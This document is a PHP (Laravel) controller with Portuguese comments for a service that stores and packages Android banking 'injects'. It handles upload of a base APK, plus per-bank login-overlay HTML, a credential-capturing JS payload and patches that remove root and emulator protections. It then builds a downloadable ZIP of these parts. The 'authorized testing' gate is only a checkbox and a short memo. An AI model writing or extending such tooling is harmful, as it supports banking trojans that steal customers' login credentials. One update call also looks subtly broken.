<?php

namespace App\Http\Controllers;

use App\Models\BankInject;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;

class BankInjectController extends Controller
{
    public function index(Request $request)
    {
        $items = BankInject::where('user_id', $request->user()->id)
            ->orderByDesc('id')
            ->get()
            ->each(function ($item) {
                $item->name = $item->inject_type;
                $item->identifier = $item->inject_type;
            });

        return response()->json(['data' => $items, 'items' => $items]);
    }

    /**
     * DEFINIÇÃO TÉCNICA DE "INJETAR" (Fase 3 — 5 linhas):
     * "Injeção bancária substitui o WebView padrão por uma versão customizada
     *  contendo overlay de login bancário específico, remoção de proteções de
     *  raiz/emulador e injeção de JS customizado para capturar credenciais.
     *  O payload modifica apenas as telas de autenticação, não o kernel do sistema."
     * Implementação nesta fase: overlay_html (template do overlay por banco) +
     * js_payload (JS do laboratório) + protection_patches (pares localizados
     * file/search/replace aplicados pelo BankInjectService com relatório) +
     * target_bank gravados no BankInject; APK base opcional em file_path.
     * GATE LEGÍTIMO: qualquer payload (overlay/JS/pares) exige
     * terms_accepted=true + auth_memo (quem autorizou + escopo do teste).
     */
    public const INJECT_SPEC = 'webview-overlay';

    public const LEGAL_NOTICE = \App\Services\BankInjectService::LEGAL_NOTICE;

    public function store(Request $request)
    {
        $validated = $request->validate([
            'bank_name'   => 'required|string|max:255',
            'name'        => 'nullable|string|max:255',
            'inject_type' => 'nullable|string|max:255',
            'target_bank' => 'nullable|string|max:255',
            'overlay_html' => 'nullable|string',
            'js_payload'  => 'nullable|string|max:20000',
            'protection_patches' => 'nullable|string|max:20000',
            'terms_accepted' => 'nullable|boolean',
            'auth_memo'   => 'nullable|string|max:500',
            'apk_file'    => 'nullable|file|max:51200|mimes:apk,zip',
        ]);

        // GATE LEGÍTIMO: payload exige autorização explícita + memo.
        $this->enforceTermsGate($validated);

        $injectType = $validated['inject_type'] ?? $validated['name'] ?? 'default';
        $filePath = null;
        $fileSize = null;

        if ($request->hasFile('apk_file')) {
            $file = $request->file('apk_file');
            $fileName = time() . '_' . Str::slug($validated['bank_name']) . '.apk';
            $filePath = $file->storeAs('inject-bancos', $fileName, 'public');
            $fileSize = $file->getSize();
        }

        $item = BankInject::create([
            'user_id'     => $request->user()->id,
            'bank_name'   => $validated['bank_name'],
            'target_bank' => $validated['target_bank'] ?? $validated['bank_name'],
            'inject_type' => $injectType,
            'overlay_html' => $validated['overlay_html'] ?? null,
            'js_payload'  => $validated['js_payload'] ?? null,
            'protection_patches' => $validated['protection_patches'] ?? null,
            'terms_accepted' => (bool) ($validated['terms_accepted'] ?? false),
            'auth_memo'   => $validated['auth_memo'] ?? null,
            'file_path'   => $filePath,
            'file_size'   => $fileSize,
        ]);

        return response()->json(['message' => 'Inject configurado com APK', 'item' => $item, 'inject_spec' => self::INJECT_SPEC], 201);
    }

    /**
     * Gate de uso legítimo (422 quando payload sem autorização).
     */
    protected function enforceTermsGate(array $validated): void
    {
        $hasPayload = !empty($validated['overlay_html'])
            || !empty($validated['js_payload'])
            || !empty($validated['protection_patches']);

        if (!$hasPayload) {
            return;
        }

        $errors = [];
        if (empty($validated['terms_accepted'])) {
            $errors['terms_accepted'] = ['Payload de injeção exige terms_accepted=true (uso autorizado em testes de segurança).'];
        }
        if (empty($validated['auth_memo']) || mb_strlen(trim($validated['auth_memo'])) < 10) {
            $errors['auth_memo'] = ['Informe auth_memo com quem autorizou + escopo do teste (mín. 10 caracteres).'];
        }

        if (!empty($errors)) {
            throw \Illuminate\Validation\ValidationException::withMessages($errors);
        }
    }

    /**
     * POST /bank-injects/{id}/build-pack — gera o ZIP auditável do pacote
     * (overlay.html + payload.js + config.json + README_LEGAL.txt).
     */
    public function buildPack(Request $request, BankInject $bankInject)
    {
        $this->authorizeOwner($request, $bankInject);

        if (!$bankInject->terms_accepted || empty($bankInject->auth_memo)) {
            return response()->json([
                'message' => 'Pacote bloqueado: terms_accepted + auth_memo obrigatórios.',
                'legal' => self::LEGAL_NOTICE,
            ], 422);
        }

        try {
            $zipPath = \App\Services\BankInjectService::buildPack($bankInject);
        } catch (\Throwable $e) {
            return response()->json(['message' => 'Falha ao montar pacote: ' . $e->getMessage()], 500);
        }

        $name = 'inject_pack_' . $bankInject->id . '_' . Str::slug($bankInject->bank_name) . '.zip';
        return response()->download($zipPath, $name)->deleteFileAfterSend(true);
    }

    public function download($id, Request $request)
    {
        $inject = BankInject::where('user_id', $request->user()->id)->findOrFail($id);

        if (!$inject->file_path) {
            return response()->json(['message' => 'Nenhum APK disponível para download'], 404);
        }

        $filePath = storage_path('app/public/' . $inject->file_path);
        if (!file_exists($filePath)) {
            return response()->json(['message' => 'Arquivo não encontrado'], 404);
        }

        return response()->download($filePath, $inject->bank_name . '.apk');
    }

    public function update(Request $request, BankInject $bankInject)
    {
        $this->authorizeOwner($request, $bankInject);

        $validated = $request->validate([
            'bank_name'   => 'sometimes|string|max:255',
            'name'        => 'sometimes|string|max:255',
            'inject_type' => 'sometimes|string|max:255',
            'target_bank' => 'nullable|string|max:255',
            'overlay_html' => 'nullable|string',
            'js_payload'  => 'nullable|string|max:20000',
            'protection_patches' => 'nullable|string|max:20000',
            'terms_accepted' => 'nullable|boolean',
            'auth_memo'   => 'nullable|string|max:500',
            'status'      => 'sometimes|string|max:50',
            'apk_file'    => 'nullable|file|mimes:apk,zip|max:51200',
        ]);

        if ($request->hasFile('apk_file')) {
            if ($bankInject->file_path) {
                Storage::disk('public')->delete($bankInject->file_path);
            }
            $file = $request->file('apk_file');
            $fileName = time() . '_' . Str::slug($validated['bank_name'] ?? $bankInject->bank_name) . '.apk';
            $bankInject->file_path = $file->storeAs('inject-bancos', $fileName, 'public');
            $bankInject->file_size = $file->getSize();
        }

        if (array_key_exists('name', $validated)) {
            if (!array_key_exists('inject_type', $validated)) {
                $validated['inject_type'] = $validated['name'];
            }
            unset($validated['name']);
        }

        // Gate sobre o estado FINAL (novos valores + existentes).
        $final = array_merge($bankInject->only([
            'overlay_html', 'js_payload', 'protection_patches',
            'terms_accepted', 'auth_memo',
        ]), $validated);
        $this->enforceTermsGate($final);

        $bankInject->update($validated);

        return response()->json(['message' => 'Inject atualizado', 'item' => $bankInject->load('file_path')]);
    }

    public function destroy(Request $request, BankInject $bankInject)
    {
        $this->authorizeOwner($request, $bankInject);
        if ($bankInject->file_path) {
            Storage::disk('public')->delete($bankInject->file_path);
        }
        $bankInject->delete();

        return response()->json(['message' => 'Inject excluído']);
    }

    private function authorizeOwner(Request $request, BankInject $item): void
    {
        if ($item->user_id !== $request->user()->id) {
            abort(403, 'Acesso negado.');
        }
    }
}